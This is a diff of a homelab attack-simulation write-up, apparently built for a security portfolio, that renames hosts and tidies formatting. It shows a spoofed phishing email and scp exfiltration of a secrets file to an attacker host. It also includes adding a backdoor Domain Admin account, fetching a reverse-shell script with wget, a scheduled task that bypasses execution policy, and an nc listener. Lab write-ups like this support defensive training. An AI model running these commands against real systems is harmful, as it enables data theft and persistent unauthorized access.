@@ -127,7 +127,7 @@ from email.message import EmailMessage
 
 msg = EmailMessage()
 msg["Subject"] = "Update Password!"
-msg["From"] = "project-hrteam@corp.project-x-dc.com"
+msg["From"] = "project-hrteam@corp.project-dc.com"
 msg["To"] = "janed@linux-client"
 
 msg.set_content("Verify your account.")
@@ -168,11 +168,11 @@ Access successful.
 ## Lateral Movement + Privilege Escalation
 
 ### Mandatory VMs
-- project-x-sec-box
-- project-x-linux-client
-- project-x-win-client
-- project-x-dc
-- project-x-attacker
+- project-sec-box
+- project-linux-client
+- project-win-client
+- project-dc
+- project-attacker
 
 ### Network Enumeration
 
@@ -233,20 +233,17 @@ C:\Users\Administrator\Documents\ProductionFiles\secrets.txt
 
 ### Mandatory VMs
 
-- project-x-sec-box
-- project-x-dc
-- project-x-attacker
-
-## Transfer File via SCP
+- project-sec-box
+- project-dc
+- project-attacker
+### Transfer File via SCP
 
 On DC (PowerShell):
-
 ```
 scp ".\secrets.txt" attacker@10.0.0.50:/home/attacker/my_sensitive_file.txt
 ```
 
 Attacker retrieves file locally.
-
 ```
 cd /home/attacker
 ls
@@ -255,74 +252,58 @@ ls
 Exfiltration complete.
 
 ---
+## Persistence
 
-# Persistence
-
-## Mandatory VMs
-
-- project-x-sec-box
-    
-- project-x-dc
-    
-- project-x-attacker
-    
-
-## Create New Admin User
+### Mandatory VMs
+- project-sec-box
+- project-dc
+- project-attacker
+### Create New Admin User
 
 On Domain Controller:
-
 ```
-net user project-x-user @mysecurepassword1! /add
-net localgroup Administrators project-x-user /add
-net group "Domain Admins" project-x-user /add
+net user project-user @mysecurepassword1! /add
+net localgroup Administrators project-user /add
+net group "Domain Admins" project-user /add
 ```
 
 Persistent privileged account established.
-
-## Scheduled Task + Reverse Shell
+### Scheduled Task + Reverse Shell
 
 Create reverse shell script on Kali:
-
 ```
 sudo nano reverse.ps1
 ```
 
 Script connects back to attacker on port 4444.
-
 Host file via python server:
-
 ```
 python3 -m http.server
 ```
 
 Download on DC:
-
 ```
 wget http://10.0.0.50:8000/reverse.ps1
 ```
 
 Move to:
-
 ```
 C:\Users\Administrator\AppData\Local\Microsoft\Windows\
 ```
 
 Create scheduled task:
-
 ```
 schtasks /create /tn "PersistenceTask" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Administrator\AppData\Local\Microsoft\Windows\reverse.ps1" /sc daily /st 12:00
 ```
 
-## Catch Reverse Shell
+### Catch Reverse Shell
 
 On attacker:
-
 ```
 nc -lvnp 4444
 ```
 
 Trigger:
-
 ```
 powershell.exe -executionpolicy bypass .\reverse.ps1
 ```
@@ -330,29 +311,10 @@ powershell.exe -executionpolicy bypass .\reverse.ps1
 Reverse shell connects successfully.
 
 ---
-
-# Conclusion
+## Conclusion
 
 This simulation demonstrated the complete attack chain:
-
 - Recon → Initial Access → Lateral Movement → Domain Compromise
-    
 - Privilege Escalation → Data Exfiltration → Persistence
-    
 
 The exercise shows how weak passwords, exposed services, misconfiguration, and social engineering create a full compromise path inside enterprise environments. The SIEM, endpoint logs, network telemetry, and detections built earlier are used later to analyze and respond to this attack from a defender perspective.
-
----
-
-If you want, I can also create:
-
-- A full “Defender Write-Up” describing how Wazuh detects each step
-    
-- MITRE ATT&CK mapping for all actions
-    
-- A single README summarizing the entire homelab for recruiters
-    
-- Mermaid diagrams or architecture diagrams for your GitHub repo
-    
-
-Just tell me what you prefer.
